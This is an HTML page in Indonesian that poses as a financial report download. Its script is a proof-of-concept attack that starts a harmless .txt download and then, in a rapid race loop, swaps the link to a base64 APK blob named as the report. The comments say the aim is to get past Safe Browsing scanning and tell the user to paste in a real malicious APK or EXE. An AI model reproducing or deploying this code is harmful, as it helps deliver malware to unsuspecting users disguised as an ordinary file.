<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Document</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: monospace; background: #111; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
  .panel { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #333; max-width: 400px; width: 100%; }
  button { padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 4px; color: #ff0; }
</style>
</head>
<body>

<div class="panel">
  <h2>📄 Laporan Keuangan</h2>
  <p>Klik untuk mengunduh laporan (.txt)</p>
  <button id="startBtn">Download Laporan</button>
  <div id="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. PERSIAPAN FILE (AMAN vs JAHAT)
  // ============================================
  
  // A. File Aman (TXT)
  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
  var safeUrl = URL.createObjectURL(safeBlob);

  // B. File Jahat (APK/EXE Base64)
  // "UEsDB..." adalah header ZIP/APK. Ganti dengan Base64 APK/EXE asli Anda.
  var b64Malicious = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
  var binary = atob(b64Malicious);
  var bytes = new Uint8Array(binary.length);
  for (var i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  
  // C. File Jahat dengan MIME Type berbahaya
  var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
  var maliciousUrl = URL.createObjectURL(maliciousBlob);

  // ============================================
  // 2. RACE CONDITION (TOCTOU)
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    statusEl.innerText = "Memulai unduhan...";

    var a = document.createElement('a');
    a.style.display = 'none';
    document.body.appendChild(a);

    // A. Set Awal: File AMAN
    a.href = safeUrl;
    a.download = 'Laporan_Keuangan.txt';
    
    // B. Picu Unduhan (Safe Browsing akan memindai TXT ini)
    a.click();

    // C. RACE CONDITION
    // Kita menggunakan loop rekursif (setTimeout 0ms) untuk mengubah link
    // setelah click() dieksekusi, tetapi sebelum browser menyelesaikan proses.
    
    var attempts = 0;
    function race() {
      attempts++;
      
      // Ganti ke file JAHAT
      a.href = maliciousUrl;
      a.download = 'Laporan_Keuangan.apk';
      
      // Trigger ulang
      a.click();

      if (attempts < 10) {
        // setTimeout 0ms berjalan di event loop berikutnya,
        // memberikan kesempatan bagi browser untuk memproses klik pertama.
        setTimeout(race, 0); 
      }
    }
    
    // Mulai race
    race();

    // Cleanup
    setTimeout(function() {
      document.body.removeChild(a);
      URL.revokeObjectURL(safeUrl);
      URL.revokeObjectURL(maliciousUrl);
      statusEl.innerText = "Selesai. Cek folder unduhan.";
    }, 5000);
  });

})();
</script>
</body>
</html>
